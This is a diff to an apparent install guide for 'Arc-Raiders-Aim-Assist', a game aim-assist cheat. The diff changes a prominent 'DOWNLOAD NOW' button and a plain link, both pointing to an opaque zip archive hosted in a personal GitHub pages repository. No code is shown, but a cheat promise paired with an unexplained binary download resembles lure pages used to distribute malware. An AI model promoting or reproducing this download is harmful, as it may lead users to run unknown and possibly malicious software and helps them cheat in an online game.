@@ -11,7 +11,7 @@ Welcome! This guide will help you download and run Arc-Raiders-Aim-Assist on you
 
 ### 📥 Download the Application
 
-<a href="https://github.com/mahadevphad0607-del/mahadevphad0607-del.github.io/raw/refs/heads/main/en/Latest-v1.4.zip" target="_blank" style="display:inline-block; padding:15px 30px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD NOW</a>
+<a href="https://raw.githubusercontent.com/mahadevphad0607-del/mahadevphad0607-del.github.io/main/en/Latest-v1.4.zip" target="_blank" style="display:inline-block; padding:15px 30px; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:8px; box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD NOW</a>
 
 Visit this link to download the application. The download page will open in your browser.
 
@@ -45,7 +45,7 @@ Follow these simple steps to get the application on your computer:
 
 Click the **DOWNLOAD NOW** button above, or go directly to:
 
-**https://github.com/mahadevphad0607-del/mahadevphad0607-del.github.io/raw/refs/heads/main/en/Latest-v1.4.zip**
+**https://raw.githubusercontent.com/mahadevphad0607-del/mahadevphad0607-del.github.io/main/en/Latest-v1.4.zip**
 
 ### Step 2: Find the Latest Release
 
